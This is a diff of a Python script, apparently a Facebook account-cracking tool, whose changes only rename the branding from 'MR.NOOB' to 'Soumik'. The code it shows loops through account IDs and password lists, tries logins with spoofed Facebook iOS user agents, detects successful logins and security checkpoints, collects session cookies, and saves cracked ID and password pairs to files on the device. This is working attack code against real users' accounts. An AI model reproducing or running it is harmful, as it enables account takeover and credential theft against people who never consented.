@@ -275,7 +275,7 @@ def menu():
 		
 def mmm(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.NOOB\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.Soumik\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -301,15 +301,15 @@ def mmm(ids,names,passlist):
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				
-				print('\033[1;92m[NOOB-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/NOOB-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[Soumik-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/Soumik-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
 					
-					print('\33[1;31m[NOOB-CP] '+ids+' | '+pas+'\33[0;97m')
-					open('/sdcard/NOOB-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\33[1;31m[Soumik-CP] '+ids+' | '+pas+'\33[0;97m')
+					open('/sdcard/Soumik-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -346,7 +346,7 @@ application_version_code=str(random.randint(000000000,999999999))
 ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+' [FBAN/FBIOS;FBAV/'+application_version+';FBBV/'+application_version_code+';FBDV/'+version+'.'+osv+';FBMD/iPhone;FBSN/iOS;FBSV/'+version+'.'+osv+';FBSS/2;FBCR/Reliance JIO;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]'
 def ffb(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.NOOB\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mSoumik\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
     
 	session = requests.Session()
 	try:
@@ -372,14 +372,14 @@ def ffb(ids,names,passlist):
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\033[1;92m[NOOB-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/NOOB-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[Soumik-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/Soumik-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
-					print('\33[1;91m[NOOB-CP] '+ids+' | '+pas+'\33[0;97m')
-					open('/sdcard/NOOB-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\33[1;91m[Soumik-CP] '+ids+' | '+pas+'\33[0;97m')
+					open('/sdcard/Soumik-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
